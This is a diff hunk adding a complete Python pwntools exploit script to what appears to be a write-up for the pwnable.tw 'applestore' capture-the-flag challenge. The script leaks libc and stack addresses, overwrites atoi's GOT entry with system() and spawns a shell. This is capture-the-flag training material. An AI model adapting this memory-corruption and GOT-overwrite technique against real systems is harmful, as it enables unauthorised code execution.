@@ -96,3 +96,55 @@ In [21]: def f(index, items_prices , target_number, used) :
 
     Returns:
         bool: True if a valid combination is found, otherwise False.
+        
+## 🔹 **Exploit Code** 
+        
+``` python
+#! /usr/bin/python3.10
+from pwn import *
+
+p = process("./applestore_patched")
+# p = remote("chall.pwnable.tw", 10104)
+libc_elf = ELF("./libc_32.so.6")
+prog_elf = ELF("./applestore_patched")
+
+l = [199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 199, 499, 499, 499, 499, 499, 499, 399]
+_map = {199: "1", 499: "3", 399: "4"}
+
+for _ in l:
+    p.sendlineafter("> ", "2")
+    p.sendlineafter("Device Number> ", _map[_])
+
+# pause()
+p.sendlineafter("> ", "5")
+p.sendlineafter("Let me check your cart. ok? (y/n) > ", "y")
+p.sendafter("> ", p32(0x804b033, "little") + b"\x00" * 12)
+p.sendlineafter("Item Number> ", "28")
+p.recvuntil("Remove 28:")
+libc_leak = p.recvline()[:-1]
+libc_leak = int.from_bytes(libc_leak[1:5], "little")
+print("libc_leak @ ", hex(libc_leak))
+libc_base = libc_leak - libc_elf.symbols["__libc_start_main"]
+libc_elf.address = libc_base
+
+atoi_got_addr = prog_elf.got["atoi"]
+system_addr = libc_elf.symbols["system"]
+environ = libc_elf.symbols["environ"]
+
+p.sendafter("> ", p32(0x804b034, "little") + b"\x00" * 12)
+p.sendlineafter("Let me check your cart. ok? (y/n) > ", b"y\x00" + p32(environ))
+p.recvuntil("27: ")
+stack_leak = int.from_bytes(p.recv(4), "little")
+print("stack_leak @ ", hex(stack_leak))
+
+delete_saved_ebp = stack_leak - 0x104
+print("saved ebp ptr @ ", hex(delete_saved_ebp))
+
+p.sendafter("> ", p32(0x804b033, "little") + b"\x00" * 4 + p32(delete_saved_ebp - 0x0c) + p32(atoi_got_addr + 0x22))
+p.sendlineafter("Item Number> ", "28")
+p.recvuntil("Remove 28:")
+
+p.sendlineafter("> ", p32(system_addr) + b";sh\x00")
+
+p.interactive()
+```
